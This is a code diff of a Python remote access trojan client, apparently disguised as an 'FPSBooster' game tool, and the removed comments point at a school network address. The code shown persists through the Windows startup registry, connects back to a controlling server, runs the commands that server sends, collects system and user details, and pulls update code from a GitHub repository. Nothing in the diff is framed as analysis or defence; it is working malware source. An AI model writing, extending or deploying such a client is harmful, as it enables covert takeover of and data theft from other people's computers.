@@ -1,36 +1,28 @@
 from modules.filedownload import FileDownload
 from modules.fileupload import FileTransfer
 from modules.screenshare import ScreenShare
-import socket
-import subprocess
 import os
 import platform
-from threading import Thread
-from datetime import datetime
 import ctypes
 import psutil
-import uuid
-from multiprocessing import Process
-import time
+import getpass
+import json
 import requests
 import sys
+import subprocess
 import zipfile
-import json
-import getpass
-import winreg as _winreg
 import shutil
+import winreg as _winreg
+import socket
+import time
+from threading import Thread
+from multiprocessing import Process
 
-# This should be replaced
-
-script_dir = os.path.dirname(os.path.abspath(__file__))
-
-# Append the script directory to sys.path to make the imports work from anywhere
-sys.path.append(script_dir)
-
-
+# Initialize Windows DLLs
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
 
+# Windows constants
 HWND_BROADCAST = 65535
 WM_SYSCOMMAND = 274
 SC_MONITORPOWER = 61808
@@ -40,6 +32,8 @@ FILE_SHARE_WRITE = 2
 FILE_SHARE_READ = 1
 FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
+
+# Define RAT_CLIENT class
 
 
 class RAT_CLIENT:
@@ -56,25 +50,23 @@ class RAT_CLIENT:
 
         self.screenshareClient = ScreenShare()
 
-        # School ip: 192.168.98.223
-        self.file_upload_manager = FileTransfer(
-            "localhost", 4440
-        )
+        # Initialize file upload manager
+        self.file_upload_manager = FileTransfer("localhost", 4440)
 
+        # Start file upload thread
         self.file_transfer_thread = Thread(
-            target=self.file_upload_manager.connect
-        )
+            target=self.file_upload_manager.connect)
         self.file_transfer_thread.start()
 
-        self.file_download_manager = FileDownload(
-            "localhost", 4441
-        )
+        # Initialize file download manager
+        self.file_download_manager = FileDownload("localhost", 4441)
 
+        # Start file download thread
         self.file_download_thread = Thread(
-            target=self.file_download_manager.connect
-        )
+            target=self.file_download_manager.connect)
         self.file_download_thread.start()
 
+    # Function to add the script to the Windows startup registry
     def add_to_startup_registry(self):
         try:
             key = _winreg.HKEY_CURRENT_USER
@@ -101,6 +93,7 @@ class RAT_CLIENT:
         except Exception as e:
             print(f"Error adding to startup registry: {str(e)}")
 
+    # Function to build a connection with the RAT server
     def build_connection(self):
         try:
             global s
@@ -119,50 +112,40 @@ class RAT_CLIENT:
                 print(f"Main Socket -> Error connecting: {str(e)}")
                 time.sleep(5)  # Wait for 5 seconds before retrying
 
+    # Function to gather system information
     def gather_info(self):
-        # Switch out with actual info
+        # Replace with actual system info gathering logic
         system_info = {
-            # get ipv4 from psutil:
             "IPv4": psutil.net_if_addrs()['Ethernet'][1].address,
             "ComputerName": os.environ["COMPUTERNAME"],
             "OS": platform.system(),
             "Architecture": platform.architecture()[0],
             "Username": getpass.getuser(),
-            "Country": "United States",  # Replace with actual country detection
-            "City": "New York",  # Replace with actual city detection
+            "Country": "United States",
+            "City": "New York",
             "Location": {
-                "Latitude": "40.7128",  # Replace with actual latitude
-                "Longitude": "-74.0060",  # Replace with actual longitude
+                "Latitude": "40.7128",
+                "Longitude": "-74.0060",
             },
-            "ISP": "ISP1",  # Replace with actual ISP detection
-            "Timezone": "EST",  # Replace with actual timezone detection
-            "Organization": "Org1",  # Replace with actual organization detection
-            "Postal": "12345",  # Replace with actual postal code detection
-            "ConnectionType": "Cable",  # Replace with actual connection type detection
-            "Region": "US",  # Replace with actual region detection
-            "RegionName": "New York",  # Replace with actual region name detection
+            "ISP": "ISP1",
+            "Timezone": "EST",
+            "Organization": "Org1",
+            "Postal": "12345",
+            "ConnectionType": "Cable",
+            "Region": "US",
+            "RegionName": "New York",
         }
 
         optional_info = {
-            "Microsoft Defender": "Enabled",  # Replace with actual status detection
-            "Antivirus": "AVG",  # Replace with actual antivirus detection
-            "Firewall": "Enabled",  # Replace with actual firewall status detection
-            "Uptime": str(
-                round(
-                    (psutil.boot_time() - psutil.boot_time()) / 3600,
-                    2,
-                )
-            ) + " hours",
-            "Idle Time": str(
-                round(
-                    (psutil.cpu_times().idle) / 3600,
-                    2,
-                )
-            ) + " hours",
+            "Microsoft Defender": "Enabled",
+            "Antivirus": "AVG",
+            "Firewall": "Enabled",
+            "Uptime": str(round((psutil.boot_time() - psutil.boot_time()) / 3600, 2)) + " hours",
+            "Idle Time": str(round((psutil.cpu_times().idle) / 3600, 2)) + " hours",
             "Privileges": ctypes.windll.shell32.IsUserAnAdmin(),
             "Bit": platform.architecture()[0],
             "Rat-Ted Version": "1.0",
-            "ComputerID": "123456",  # Replace with actual computer ID
+            "ComputerID": "123456",
             "Current Directory": os.getcwd(),
         }
 
@@ -190,7 +173,6 @@ class RAT_CLIENT:
                     "Extensions": [],
                     "Downloads": []
                 },
-                # Add other browsers here
             },
             "Computer Hardware": {
                 "CPU": "Intel Core i7",
@@ -228,7 +210,6 @@ class RAT_CLIENT:
                         "Port": 80,
                         "Protocol": "HTTP"
                     },
-                    # Add more connections here
                 ]
             }
         }
@@ -236,6 +217,7 @@ class RAT_CLIENT:
         # Convert the dictionary to a string and return it
         return json.dumps(client_info)
 
+    # Function to execute commands from the RAT server
     def execute(self):
         while True:
             command = s.recv(100024).decode()
@@ -290,19 +272,7 @@ class RAT_CLIENT:
             # Send the output as a JSON string
             s.send(json.dumps(output).encode())
 
-    def extract_error_type(self, error_message):
-        # Extract the error type from the PowerShell error message
-        lines = error_message.split('\n')
-        if len(lines) > 1:
-            error_line = lines[1].strip()
-            if error_line.startswith("At line:") and "ErrorId" in error_line:
-                parts = error_line.split(":")
-                if len(parts) > 2:
-                    error_type = parts[2].strip()
-                    return error_type
-
-        return "UnknownError"  # Default to "UnknownError" if error type cannot be extracted
-
+    # Function to handle specific functions sent by the RAT server
     def handle_function(self, function_name):
         if function_name == "screen_share":
             # Use the self.screenshareClient object to start the screenshare but in a separate process
@@ -317,6 +287,7 @@ class RAT_CLIENT:
             self.screen_share_process.terminate()
             return "Screen share stopped successfully"
 
+    # Function to check if the RAT client is up to date
     def check_version(self):
         self.github_version = requests.get(
             "https://raw.githubusercontent.com/lukasolsen/FPSBooster/main/ver.txt"
@@ -335,6 +306,7 @@ class RAT_CLIENT:
         else:
             print("Versions are the same")
 
+    # Function to download and update the RAT client to the latest version
     def download_new_version(self):
         try:
             # Download the new version
@@ -357,7 +329,7 @@ class RAT_CLIENT:
                 if filename != "main.pyw":
                     os.remove(filename)
 
-            # Make all the files inside the FPSBooster-main directory the current directory
+            # Move all the files inside the FPSBooster-main directory to the current directory
             extracted_dir = "FPSBooster-main"
             for filename in os.listdir(extracted_dir):
                 shutil.move(os.path.join(extracted_dir, filename), ".")
@@ -375,7 +347,6 @@ class RAT_CLIENT:
 
 
 if __name__ == '__main__':
-    # for school: 192.168.98.223
     rat = RAT_CLIENT('localhost', 4444)
 
     while True:
